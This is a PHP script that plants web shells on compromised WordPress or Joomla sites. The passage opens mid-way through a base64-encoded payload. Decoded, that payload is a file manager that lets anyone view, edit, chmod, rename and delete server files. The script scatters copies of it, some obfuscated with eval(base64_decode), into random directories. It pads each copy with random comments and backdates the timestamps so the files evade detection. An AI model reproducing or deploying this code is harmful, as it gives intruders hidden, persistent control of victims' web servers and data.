iAgICBlY2hvICI8dHI+PHRkPkN1cnJlbnQgRmlsZSA6ICI7CiAgICBlY2hvICRfR0VUWydmaWxlc3JjJ107CiAgICBlY2hvICc8L3RyPjwvdGQ+PC90YWJsZT48YnIgLz4nOwogICAgZWNobygnPHByZT4nLmh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJF9HRVRbJ2ZpbGVzcmMnXSkpLic8L3ByZT4nKTsKfWVsc2VpZihpc3NldCgkX0dFVFsnb3B0aW9uJ10pICYmICRfUE9TVFsnb3B0J10gIT0gJ2RlbGV0ZScpewogICAgZWNobyAnPC90YWJsZT48YnIgLz48Y2VudGVyPicuJF9QT1NUWydwYXRoJ10uJzxiciAvPjxiciAvPic7CiAgICBpZigkX1BPU1RbJ29wdCddID09ICdjaG1vZCcpewogICAgICAgIGlmKGlzc2V0KCRfUE9TVFsncGVybSddKSl7CiAgICAgICAgICAgIGlmKGNobW9kKCRfUE9TVFsncGF0aCddLCRfUE9TVFsncGVybSddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkNoYW5nZSBQZXJtaXNzaW9uIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+Q2hhbmdlIFBlcm1pc3Npb24gRXJyb3IuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICBQZXJtaXNzaW9uIDogPGlucHV0IG5hbWU9InBlcm0iIHR5cGU9InRleHQiIHNpemU9IjQiIHZhbHVlPSInLnN1YnN0cihzcHJpbnRmKCclbycsIGZpbGVwZXJtcygkX1BPU1RbJ3BhdGgnXSkpLCAtNCkuJyIgLz4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXRoIiB2YWx1ZT0iJy4kX1BPU1RbJ3BhdGgnXS4nIj4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJjaG1vZCI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiAvPgogICAgICAgIDwvZm9ybT4nOwogICAgfWVsc2VpZigkX1BPU1RbJ29wdCddID09ICdyZW5hbWUnKXsKICAgICAgICBpZihpc3NldCgkX1BPU1RbJ25ld25hbWUnXSkpewogICAgICAgICAgICBpZihyZW5hbWUoJF9QT1NUWydwYXRoJ10sJHBhdGguJy8nLiRfUE9TVFsnbmV3bmFtZSddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkNoYW5nZSBOYW1lIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+Q2hhbmdlIE5hbWUgRXJyb3IuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJF9QT1NUWyduYW1lJ10gPSAkX1BPU1RbJ25ld25hbWUnXTsKICAgICAgICB9CiAgICAgICAgZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICBOZXcgTmFtZSA6IDxpbnB1dCBuYW1lPSJuZXduYW1lIiB0eXBlPSJ0ZXh0IiBzaXplPSIyMCIgdmFsdWU9IicuJF9QT1NUWyduYW1lJ10uJyIgLz4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXRoIiB2YWx1ZT0iJy4kX1BPU1RbJ3BhdGgnXS4nIj4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJyZW5hbWUiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHbyIgLz4KICAgICAgICA8L2Zvcm0+JzsKICAgIH1lbHNlaWYoJF9QT1NUWydvcHQnXSA9PSAnZWRpdCcpewogICAgICAgIGlmKGlzc2V0KCRfUE9TVFsnc3JjJ10pKXsKICAgICAgICAgICAgJGZwID0gZm9wZW4oJF9QT1NUWydwYXRoJ10sJ3cnKTsKICAgICAgICAgICAgaWYoZndyaXRlKCRmcCwkX1BPU1RbJ3NyYyddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkVkaXQgRmlsZSBEb25lLjwvZm9udD48YnIgLz4nOwogICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkVkaXQgRmlsZSBFcnJvci48L2ZvbnQ+PGJyIC8+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICB9CiAgICAgICAgZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICA8dGV4dGFyZWEgY29scz04MCByb3dzPTIwIG5hbWU9InNyYyI+Jy5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRfUE9TVFsncGF0aCddKSkuJzwvdGV4dGFyZWE+PGJyIC8+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ib3B0IiB2YWx1ZT0iZWRpdCI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiAvPgogICAgICAgIDwvZm9ybT4nOwogICAgfQogICAgZWNobyAnPC9jZW50ZXI+JzsKfWVsc2V7CiAgICBlY2hvICc8L3RhYmxlPjxiciAvPjxjZW50ZXI+JzsKICAgIGlmKGlzc2V0KCRfR0VUWydvcHRpb24nXSkgJiYgJF9QT1NUWydvcHQnXSA9PSAnZGVsZXRlJyl7CiAgICAgICAgaWYoJF9QT1NUWyd0eXBlJ10gPT0gJ2RpcicpewogICAgICAgICAgICBpZihybWRpcigkX1BPU1RbJ3BhdGgnXSkpewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5EZWxldGUgRGlyIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIERpciBFcnJvci48L2ZvbnQ+PGJyIC8+JzsKICAgICAgICAgICAgfQogICAgICAgIH1lbHNlaWYoJF9QT1NUWyd0eXBlJ10gPT0gJ2ZpbGUnKXsKICAgICAgICAgICAgaWYodW5saW5rKCRfUE9TVFsncGF0aCddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkRlbGV0ZSBGaWxlIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIEZpbGUgRXJyb3IuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBlY2hvICc8L2NlbnRlcj4nOwogICAgJHNjYW5kaXIgPSBzY2FuZGlyKCRwYXRoKTsKICAgIGVjaG8gJzxkaXYgaWQ9ImNvbnRlbnQiPjx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+CiAgICA8dHIgY2xhc3M9ImZpcnN0Ij4KICAgICAgICA8dGQ+PGNlbnRlcj5OYW1lPC9jZW50ZXI+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj5TaXplPC9jZW50ZXI+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj5QZXJtaXNzaW9uczwvY2VudGVyPjwvdGQ+CiAgICAgICAgPHRkPjxjZW50ZXI+T3B0aW9uczwvY2VudGVyPjwvdGQ+CiAgICA8L3RyPic7CgogICAgZm9yZWFjaCgkc2NhbmRpciBhcyAkZGlyKXsKICAgICAgICBpZighaXNfZGlyKCIkcGF0aC8kZGlyIikgfHwgJGRpciA9PSAnLicgfHwgJGRpciA9PSAnLi4nKSBjb250aW51ZTsKICAgICAgICBlY2hvICI8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9XCI/cGF0aD0kcGF0aC8kZGlyXCI+JGRpcjwvYT48L3RkPgogICAgICAgIDx0ZD48Y2VudGVyPi0tPC9jZW50ZXI+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj4iOwogICAgICAgIGlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsKICAgICAgICBlbHNlaWYoIWlzX3JlYWRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPic7CiAgICAgICAgZWNobyBwZXJtcygiJHBhdGgvJGRpciIpOwogICAgICAgIGlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzwvZm9udD4nOwogICAgICAgIAogICAgICAgIGVjaG8gIjwvY2VudGVyPjwvdGQ+CiAgICAgICAgPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIj9vcHRpb24mcGF0aD0kcGF0aFwiPgogICAgICAgIDxzZWxlY3QgbmFtZT1cIm9wdFwiPgoJICAgIDxvcHRpb24gdmFsdWU9XCJcIj48L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPVwiZGVsZXRlXCI+RGVsZXRlPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT1cImNobW9kXCI+Q2htb2Q8L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPVwicmVuYW1lXCI+UmVuYW1lPC9vcHRpb24+CiAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwidHlwZVwiIHZhbHVlPVwiZGlyXCI+CiAgICAgICAgPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwibmFtZVwiIHZhbHVlPVwiJGRpclwiPgogICAgICAgIDxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRwYXRoLyRkaXJcIj4KICAgICAgICA8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiPlwiIC8+CiAgICAgICAgPC9mb3JtPjwvY2VudGVyPjwvdGQ+CiAgICAgICAgPC90cj4iOwogICAgfQogICAgZWNobyAnPHRyIGNsYXNzPSJmaXJzdCI+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PC90cj4nOwogICAgZm9yZWFjaCgkc2NhbmRpciBhcyAkZmlsZSl7CiAgICAgICAgaWYoIWlzX2ZpbGUoIiRwYXRoLyRmaWxlIikpIGNvbnRpbnVlOwogICAgICAgICRzaXplID0gZmlsZXNpemUoIiRwYXRoLyRmaWxlIikvMTAyNDsKICAgICAgICAkc2l6ZSA9IHJvdW5kKCRzaXplLDMpOwogICAgICAgIGlmKCRzaXplID49IDEwMjQpewogICAgICAgICAgICAkc2l6ZSA9IHJvdW5kKCRzaXplLzEwMjQsMikuJyBNQic7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICRzaXplID0gJHNpemUuJyBLQic7CiAgICAgICAgfQoKICAgICAgICBlY2hvICI8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9XCI/ZmlsZXNyYz0kcGF0aC8kZmlsZSZwYXRoPSRwYXRoXCI+JGZpbGU8L2E+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj4iLiRzaXplLiI8L2NlbnRlcj48L3RkPgogICAgICAgIDx0ZD48Y2VudGVyPiI7CiAgICAgICAgaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsKICAgICAgICBlbHNlaWYoIWlzX3JlYWRhYmxlKCIkcGF0aC8kZmlsZSIpKSBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj4nOwogICAgICAgIGVjaG8gcGVybXMoIiRwYXRoLyRmaWxlIik7CiAgICAgICAgaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZmlsZSIpKSBlY2hvICc8L2ZvbnQ+JzsKICAgICAgICBlY2hvICI8L2NlbnRlcj48L3RkPgogICAgICAgIDx0ZD48Y2VudGVyPjxmb3JtIG1ldGhvZD1cIlBPU1RcIiBhY3Rpb249XCI/b3B0aW9uJnBhdGg9JHBhdGhcIj4KICAgICAgICA8c2VsZWN0IG5hbWU9XCJvcHRcIj4KCSAgICA8b3B0aW9uIHZhbHVlPVwiXCI+PC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT1cImRlbGV0ZVwiPkRlbGV0ZTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9XCJjaG1vZFwiPkNobW9kPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT1cInJlbmFtZVwiPlJlbmFtZTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9XCJlZGl0XCI+RWRpdDwvb3B0aW9uPgogICAgICAgIDwvc2VsZWN0PgogICAgICAgIDxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInR5cGVcIiB2YWx1ZT1cImZpbGVcIj4KICAgICAgICA8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJuYW1lXCIgdmFsdWU9XCIkZmlsZVwiPgogICAgICAgIDxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRwYXRoLyRmaWxlXCI+CiAgICAgICAgPGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIj5cIiAvPgogICAgICAgIDwvZm9ybT48L2NlbnRlcj48L3RkPgogICAgICAgIDwvdHI+IjsKICAgIH0KICAgIGVjaG8gJzwvdGFibGU+CiAgICA8L2Rpdj4nOwp9CmVjaG8gJzxiciAvPgo8L0JPRFk+CjwvSFRNTD4nOwpmdW5jdGlvbiBwZXJtcygkZmlsZSl7CiAgICAkcGVybXMgPSBmaWxlcGVybXMoJGZpbGUpOwoKaWYgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgewogICAgLy8gU29ja2V0CiAgICAkaW5mbyA9ICdzJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweEEwMDApID09IDB4QTAwMCkgewogICAgLy8gU3ltYm9saWMgTGluawogICAgJGluZm8gPSAnbCc7Cn0gZWxzZWlmICgoJHBlcm1zICYgMHg4MDAwKSA9PSAweDgwMDApIHsKICAgIC8vIFJlZ3VsYXIKICAgICRpbmZvID0gJy0nOwp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NjAwMCkgPT0gMHg2MDAwKSB7CiAgICAvLyBCbG9jayBzcGVjaWFsCiAgICAkaW5mbyA9ICdiJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweDQwMDApID09IDB4NDAwMCkgewogICAgLy8gRGlyZWN0b3J5CiAgICAkaW5mbyA9ICdkJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweDIwMDApID09IDB4MjAwMCkgewogICAgLy8gQ2hhcmFjdGVyIHNwZWNpYWwKICAgICRpbmZvID0gJ2MnOwp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MTAwMCkgPT0gMHgxMDAwKSB7CiAgICAvLyBGSUZPIHBpcGUKICAgICRpbmZvID0gJ3AnOwp9IGVsc2UgewogICAgLy8gVW5rbm93bgogICAgJGluZm8gPSAndSc7Cn0KCi8vIE93bmVyCiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMTAwKSA/ICdyJyA6ICctJyk7CiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7CiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDQwKSA/CiAgICAgICAgICAgICgoJHBlcm1zICYgMHgwODAwKSA/ICdzJyA6ICd4JyApIDoKICAgICAgICAgICAgKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7CgovLyBHcm91cAokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAyMCkgPyAncicgOiAnLScpOwokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAxMCkgPyAndycgOiAnLScpOwokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwOCkgPwogICAgICAgICAgICAoKCRwZXJtcyAmIDB4MDQwMCkgPyAncycgOiAneCcgKSA6CiAgICAgICAgICAgICgoJHBlcm1zICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOwoKLy8gV29ybGQKJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsKJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDIpID8gJ3cnIDogJy0nKTsKJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDEpID8KICAgICAgICAgICAgKCgkcGVybXMgJiAweDAyMDApID8gJ3QnIDogJ3gnICkgOgogICAgICAgICAgICAoKCRwZXJtcyAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsKCiAgICByZXR1cm4gJGluZm87Cn0KPz4=';

$wp_enc_file = '<?php eval("?>" . base64_decode("'.$wp_code.'")); ?>';
$wp_dec_file = base64_decode($wp_code);

$jm_enc_file = '<?php eval("?>" . base64_decode("'.$jm_code.'")); ?>';
$jm_dec_file = base64_decode($jm_code);

$orig_dir = getcwd();

$counter = 0;
do{
	foreach(glob("*") as $file) {
		if(strpos($file, "wp-config.php") !== false) {
			define('PLATFORM', 'WORDPRESS');
		}
		if(strpos($file, "configuration.php") !== false) {
			define('PLATFORM', 'JOOMLA');
		}
	}
	if(!defined('PLATFORM')) {
		chdir('..');
		$counter++;
	}
	else {
		$site_root_dir = getcwd();
	}
}while(!defined('PLATFORM') && $counter < MAX_LEVELS_UP);

if(!defined('PLATFORM')) {
	exit("Unknown platform!");
}

$all_dirs = array();

get_all_dirs(getcwd());

//$all_dirs = array_filter($all_dirs, "filter_dirs");

if(count($all_dirs) >= 10) {
	$num_of_rand_dirs = 10;
}
else {
	$num_of_rand_dirs = count($all_dirs);
}

if($num_of_rand_dirs > count($all_dirs)) {
	$num_of_rand_dirs = count($all_dirs);
}

$chosen_dirs_indexes = array_rand($all_dirs, $num_of_rand_dirs);

print "PLATFORM : " . PLATFORM . "<br>\n";

if(PLATFORM == 'WORDPRESS') {
	$contents = array($wp_enc_file, $wp_dec_file);
}

if(PLATFORM == 'JOOMLA') {
	$contents = array($jm_enc_file, $jm_dec_file);
}

$web_dirname = dirname($_SERVER['REQUEST_URI']);
$site_root_dir_splitted = explode("/", $site_root_dir);
$web_dir_splitted = explode("/", $web_dirname);

if($site_root_dir_splitted[count($site_root_dir_splitted)-1] == $web_dir_splitted[1]) {
	$site_dir = $web_dir_splitted[1];
}

$content_type = 0;
$periods_count = 0;
$string = implode(",", range('a','z'));
foreach($chosen_dirs_indexes as $chosen_dir_index) {
	if((time() - $start_time) > MAX_EXEC_TIME) {
		exit;
	}

	$file_name = get_file_name($all_dirs[$chosen_dir_index] . '/');
	if($periods_count < 0) {
		$periods_count++;
		$file_name .= '.';
	}
	file_put_contents($file_name, $contents[$content_type] . "\n" . '<?php /*'.str_repeat(substr($string, 0, rand(1, strlen($string))), rand(1, 5)).'*/ ?>');
	touch($file_name, time() - rand(60*60*24, 60*60*24*800));
	$file_rel_path = substr($file_name, strlen($site_root_dir));
	if(!isset($site_dir)) {
		$site_dir = '';
	}
	$file_full_path = $site_dir . $file_rel_path;
	if($content_type == 0) {
		$content_type = 1;
	}
	else {
		$content_type = 0;
	}
	print preg_replace("/^\//", "", $file_full_path) . "<br>\n";
	flush();
}
//print PLATFORM;
//print_r($all_dirs);
?>